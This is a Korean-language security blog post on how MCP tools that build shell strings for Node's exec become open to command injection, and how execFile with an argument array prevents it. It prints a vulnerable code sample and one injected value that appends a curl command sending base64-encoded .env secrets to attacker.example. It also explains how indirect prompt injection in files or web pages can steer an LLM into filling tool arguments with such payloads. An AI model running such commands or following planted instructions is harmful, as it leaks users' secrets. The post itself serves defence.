---
title: "MCP 도구가 셸을 부를 때 — 커맨드 인젝션은 왜 생기고 어떻게 막나"
pubDate: 2026-08-12T06:20:50Z
section: "security"
tags: ["mcp", "command-injection", "child_process", "prompt-injection", "typescript"]
description: "MCP 도구가 셸 명령을 실행할 때, 그 인자를 채우는 것은 사람이 아니라 LLM이다. 문자열을 조합해 exec에 넘기는 흔한 패턴이 왜 커맨드 인젝션으로 이어지는지, 간접 프롬프트 인젝션이 이 위험을 어떻게 키우는지, execFile로 셸을 아예 거치지 않는 해법까지 코드로 정리한다."
---

MCP 도구 중 상당수는 결국 셸 명령이나 외부 프로세스를 실행한다. 저장소에서 파일을 찾고, git 로그를 뽑고, 린터나 빌드를 돌리는 식이다. 이런 도구를 만들 때 웹 입력 검증과 똑같은 감각으로 접근하면 놓치는 지점이 하나 있다. 인자를 채우는 주체가 사람이 아니라 LLM이라는 것이다.

## 흔히 나오는 취약한 코드

Node에서 셸 명령을 돌릴 때 가장 손이 먼저 가는 함수는 `child_process.exec`다. 문자열을 그대로 셸에 넘겨 실행한다.

```typescript
import { exec } from "node:child_process";
import { promisify } from "node:util";

const execAsync = promisify(exec);

async function searchFiles(pattern: string) {
  const { stdout } = await execAsync(`grep -r "${pattern}" .`);
  return stdout;
}
```

`pattern`이 `"TODO"` 같은 값이면 잘 동작한다. 하지만 `exec`는 명령 전체를 `/bin/sh -c`(윈도우는 `cmd.exe`)에 넘기고, 셸은 그 문자열 안의 `;`, `|`, `` ` ``, `$()` 같은 메타문자를 명령 구분자나 치환으로 해석한다. `pattern`에 `" . ; curl attacker.example/$(cat .env | base64) #` 같은 값이 들어오면, `grep` 다음에 이어붙은 두 번째 명령이 그대로 실행된다. 웹 폼이라면 이런 입력은 사람이 직접 타이핑해야 하지만, MCP 도구에서는 LLM이 인자를 생성한다는 점이 이야기를 다르게 만든다.

## LLM이 채우는 인자가 더 위험한 이유

LLM은 사용자의 자연어 요청뿐 아니라, 도구가 앞서 읽어들인 파일 내용이나 웹페이지 같은 외부 텍스트를 참고해서 다음 도구 호출의 인자를 채우기도 한다. 공격자가 그 외부 텍스트 안에 "다음 검색은 이 패턴으로 하라"는 식의 지시문을 심어 두면, LLM이 그걸 사용자 지시로 착각하고 그대로 인자에 옮길 수 있다. 이것이 간접 프롬프트 인젝션(indirect prompt injection)이다. 즉 공격자는 도구를 직접 호출하지 않고도, 도구가 나중에 읽을 데이터에 페이로드를 심어 인자 생성 과정을 통해 간접적으로 명령을 주입할 수 있다. 사람이 입력을 훑어보고 이상하면 멈추는 확인 절차가 도구 호출 사이에 끼어 있지 않다면, 이 경로는 사람이 개입하는 웹 폼보다 오히려 더 조용히 뚫린다.

## 해법: 셸을 아예 거치지 않는다

가장 확실한 방어는 이스케이프 규칙을 촘촘히 짜는 것이 아니라, 셸 파싱 자체를 건너뛰는 것이다. `execFile`(또는 `shell` 옵션 없이 쓰는 `spawn`)은 실행할 프로그램과 인자를 배열로 따로 받아 셸을 거치지 않고 프로세스를 직접 띄운다.

```typescript
import { execFile } from "node:child_process";
import { promisify } from "node:util";

const execFileAsync = promisify(execFile);

async function searchFiles(pattern: string) {
  const { stdout } = await execFileAsync("grep", ["-r", pattern, "."]);
  return stdout;
}
```

여기서 `pattern`은 `grep` 프로세스에 argv의 한 원소로 그대로 전달될 뿐, 어떤 셸도 그 문자열 안의 `;`나 `` ` ``를 해석하지 않는다. 공격자가 아무리 메타문자를 채워 넣어도 `grep`은 그것을 검색 패턴 텍스트로만 받는다.

## 그 밖의 방어선

인자를 배열로 넘기는 것만으로 못 막는 경우도 있다 — 실행할 프로그램 이름 자체를 인자로 받는 도구라면, 그 값은 허용 목록으로 제한해야 한다. 실행 파일 경로를 고정하고, 프로세스에 필요한 최소 권한만 주고, 타임아웃과 출력 크기 제한을 걸어 무한 실행이나 대량 출력으로 이어지는 경로도 함께 막는 것이 좋다. MCP 도구를 설계할 때는 "이 인자를 누가 채우는가"를 한 번 더 물어야 한다. 사람이 아니라 모델이 채운다는 사실이, 입력 검증을 생략해도 되는 이유가 아니라 오히려 더 신경 써야 할 이유가 된다.
